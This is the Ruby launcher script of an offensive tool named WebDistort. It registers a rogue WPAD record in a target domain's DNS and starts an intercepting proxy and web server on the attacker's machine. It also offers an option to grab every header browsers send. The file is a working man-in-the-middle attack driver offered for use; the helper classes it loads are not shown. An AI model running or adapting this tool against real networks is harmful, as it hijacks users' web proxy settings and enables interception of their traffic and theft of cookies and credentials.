#!/usr/bin/ruby
#

# define external libraries
require "rubygems"
require "dnsruby"
require "optparse"
require "socket"
require "webrick"
require "webrick/httpproxy"
require "webrick/httputils"
require "pp"

# define custom classes
require "distort_dns"
require "proxy"
require "http"


def get_ip_address
	orig, Socket.do_not_reverse_lookup = Socket.do_not_reverse_lookup, true
	
	ipAddr = ''

	UDPSocket.open do |s|
		s.connect '64.233.187.99', 1
		ipAddr = s.addr.last
	end
	ensure
		Socket.do_not_reverse_lookup = orig

	return ipAddr
end

options = {
	"run_mode" => "proxy",
	"server_ip" => get_ip_address,
	"proxy_port" => 8080,
	"http_port" => 80,
	"http_root" => Dir::pwd + "/webdistort_htdocs",
	"data_dir" => Dir::pwd + "/saved"
}
usage = ''

opts = OptionParser.new do |opts|
	opts.banner = "Usage: webdistort.rb [options]"

	opts.separator ""
	opts.separator "Required:"
	#opts.on("-u <update method>", Array, "Method used to create WPAD entry (DNS|ARPSPOOF|DHCP)")
	#opts.separator "DNS Update Arguments"
	opts.on("-d <domain>", String, "Domain to create wpad entry on") do |d|
		options["domain"] = d
	end

	opts.on("-p <primary dns address>", String, "Primary DNS Server address") do |p|
		options["primary_dns"] = p
	end
	opts.separator ""
	opts.separator "Optional:"
	opts.on("-i <ip address>", String, "Specify IP Address to run servers on, otherwise autodetect" ) do |i|
		options["server_ip"] = i
	end
	opts.on("-x <port>", "--proxy-port", "Specify port for proxy to bind") do |proxy_port|
		options["proxy_port"] = proxy_port
	end
	opts.on("-w <port>", "--http-port", "Specify port for http server to bind") do |http_port|
		options["http_port"] = http_port
	end
	opts.on("-s", "--stats", "Gather stats only. Don't intercept traffic.") do 
		options["run_mode"] = "stats"
	end
  opts.on("-g", "Grab all sent headers") do
    options["grab_headers"] = true
  end
	opts.on_tail("-h", "Print this help") do
		puts opts
		exit
	end
	usage = opts
end.parse!

if options["domain"] == nil || options["primary_dns"] == nil
	puts usage
	exit
end

dns = WebDistort::DNS.new(options['domain'], options['primary_dns'], options['server_ip'])

if options['run_mode'] == 'proxy'  
  proxy = WebDistort::Proxy.new(options)
  $proxy_pid = Process.fork do
	   ['INT', 'TERM', 'KILL'].each {|signal|
        Signal.trap(signal) { puts "Shutting down proxy" ; proxy.shutdown }
      }

    proxy.start    
  end
  puts"Starting WebDistort Proxy: PID=" + $proxy_pid.to_s 
end

httpd = WebDistort::HTTP.new(options)
$httpd_pid = Process.fork do
	['INT', 'TERM', 'KILL'].each {|signal|
              Signal.trap(signal) { puts "Shutting down HTTPd server" ; httpd.shutdown }
	}

  httpd.setup_files
  httpd.start
end
puts "Starting WebDistort HTTPD Server: PID=" + $httpd_pid.to_s


puts "Attempting to update WPAD record"
if dns.update == false
  puts "WPAD record creation failed"
end


          ['INT', 'TERM', 'KILL'].each {|signal|
              trap(signal) { 
								Process.kill(signal, $httpd_pid)
								Process.kill(signal, $proxy_pid)
							}
					}			

Process.wait
